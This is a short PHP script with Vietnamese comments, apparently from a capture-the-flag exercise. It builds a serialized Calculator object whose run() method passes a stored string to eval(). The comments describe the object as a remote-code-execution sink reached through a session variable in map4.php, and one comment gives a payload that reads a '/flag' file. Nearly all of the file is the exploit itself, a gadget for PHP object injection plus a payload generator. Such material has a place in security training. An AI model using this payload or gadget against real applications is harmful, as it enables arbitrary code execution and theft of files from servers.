<?php

class Calculator
{
    // Thuộc tính chứa đoạn mã PHP cần thực thi (ví dụ: "die(file_get_contents('/flag'));")
    public $expression;

    public function __construct($expr)
    {
        $this->expression = $expr;
    }

    /**
     * [Flow Kích hoạt Sink 1]: 
     * - Được gọi khi nạp Calculator vào $_SESSION["trainer"], sau đó bấm nút Run ở map4.php.
     * - map4.php gọi: $_SESSION["trainer"]->run() -> Nhảy vào hàm run() này!
     */
    public function run()
    {
        // [TỬ HUYỆT RCE 1]: eval() thực thi trực tiếp chuỗi PHP string trong $this->expression
        $result = eval($this->expression);
        return $result;
    }
}


$calc = new Calculator("phpinfo();"); // Truyền vào khởi tạo contructor,

echo serialize($calc);
